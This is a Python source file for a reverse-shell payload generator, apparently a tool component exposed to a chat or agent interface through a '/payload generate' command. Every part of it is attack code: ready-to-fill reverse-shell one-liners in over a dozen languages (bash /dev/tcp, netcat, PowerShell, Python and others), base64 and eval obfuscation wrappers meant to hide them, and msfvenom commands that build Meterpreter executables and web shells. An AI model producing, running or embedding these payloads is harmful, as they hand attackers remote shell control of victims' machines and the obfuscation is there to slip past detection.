import base64
import random
import string
from utils.logger import get_logger

log = get_logger("payload_generator")

SHELL_TYPES = {
    "bash": {
        "reverse_tcp": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "reverse_udp": "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
    },
    "python": {
        "reverse_tcp": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
        "reverse_tcp_short": """python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f) for f in range(3)];pty.spawn("/bin/sh")'""",
    },
    "python3": {
        "reverse_tcp": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
    },
    "perl": {
        "reverse_tcp": """perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}'""",
    },
    "php": {
        "reverse_tcp": """php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "reverse_tcp_exec": """php -r '$sock=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
    },
    "ruby": {
        "reverse_tcp": """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
    },
    "nc": {
        "reverse_tcp": "nc -e /bin/sh {LHOST} {LPORT}",
        "reverse_tcp_noe": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    },
    "ncat": {
        "reverse_tcp": "ncat {LHOST} {LPORT} -e /bin/sh",
        "reverse_ssl": "ncat --ssl {LHOST} {LPORT} -e /bin/sh",
    },
    "powershell": {
        "reverse_tcp": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
        "reverse_tcp_iex": """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    },
    "java": {
        "reverse_tcp": """r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor()""",
    },
    "nodejs": {
        "reverse_tcp": """node -e 'var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect({LPORT}, "{LHOST}", function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});'""",
    },
    "golang": {
        "reverse_tcp": """echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""",
    },
    "lua": {
        "reverse_tcp": """lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('{LHOST}',{LPORT});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" """,
    },
}

ENCODING_METHODS = {
    "base64": lambda s: base64.b64encode(s.encode()).decode(),
    "base64_url": lambda s: base64.urlsafe_b64encode(s.encode()).decode(),
    "hex": lambda s: s.encode().hex(),
    "url": lambda s: "".join(f"%{ord(c):02x}" for c in s),
}

OBFUSCATION_TEMPLATES = {
    "bash_var": """{VAR1}='{PAYLOAD}'; eval $({VAR1})""",
    "bash_echo": """echo '{PAYLOAD}' | base64 -d | bash""",
    "bash_printf": """printf '{PAYLOAD}' | /bin/sh""",
}


class PayloadGenerator:
    """Smart payload generator for reverse shells and payloads."""

    def __init__(self):
        self.shell_types = SHELL_TYPES
        self.encoding_methods = ENCODING_METHODS
        self.obfuscation_templates = OBFUSCATION_TEMPLATES
        self._generated = []

    def generate(self, lhost, lport=4444, shell_type="bash", encoding=None, obfuscate=False):
        payloads = []
        shells = self.shell_types.get(shell_type, {})

        for name, template in shells.items():
            try:
                payload = template.format(LHOST=lhost, LPORT=lport)
            except (KeyError, IndexError):
                payload = template

            entry = {
                "type": shell_type,
                "variant": name,
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
                "encoded": None,
                "obfuscated": None,
            }

            if encoding and encoding in self.encoding_methods:
                entry["encoded"] = self.encoding_methods[encoding](payload)
                entry["encoding"] = encoding

            if obfuscate:
                entry["obfuscated"] = self._obfuscate(payload)

            payloads.append(entry)
            self._generated.append(entry)

        return payloads

    def generate_all(self, lhost, lport=4444, encoding=None):
        results = []
        for shell_type in self.shell_types:
            payloads = self.generate(lhost, lport, shell_type, encoding)
            results.extend(payloads)
        return results

    def generate_meterpreter(self, lhost, lport=4444, format_type="elf"):
        formats = {
            "elf": {"ext": "elf", "cmd": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell.elf"},
            "exe": {"ext": "exe", "cmd": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/shell.exe"},
            "py": {"ext": "py", "cmd": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.py"},
            "php": {"ext": "php", "cmd": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.php"},
            "aspx": {"ext": "aspx", "cmd": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o /tmp/shell.aspx"},
            "war": {"ext": "war", "cmd": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o /tmp/shell.war"},
            "jar": {"ext": "jar", "cmd": f"msfvenom -p java/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f jar -o /tmp/shell.jar"},
        }
        fmt = formats.get(format_type, formats["elf"])
        return {
            "type": "meterpreter",
            "format": format_type,
            "command": fmt["cmd"],
            "output_file": f"/tmp/shell.{fmt['ext']}",
            "lhost": lhost,
            "lport": lport,
        }

    def _obfuscate(self, payload):
        var1 = "".join(random.choices(string.ascii_lowercase, k=8))
        var2 = "".join(random.choices(string.ascii_lowercase, k=6))
        b64 = base64.b64encode(payload.encode()).decode()
        return f"{var1}='{b64}'; {var2}=$(echo ${var1} | base64 -d); eval $({var2})"

    def get_history(self):
        return self._generated

    def format_for_prompt(self, lhost, lport=4444):
        lines = ["**Payload Generator:**"]
        lines.append(f"  Target: {lhost}:{lport}")
        lines.append(f"  Available shells: {', '.join(self.shell_types.keys())}")
        lines.append(f"  Encodings: {', '.join(self.encoding_methods.keys())}")
        lines.append(f"  Meterpreter formats: elf, exe, py, php, aspx, war, jar")
        lines.append(f"  Use: `/payload generate <type> <lhost> [lport]`")
        return "\n".join(lines)
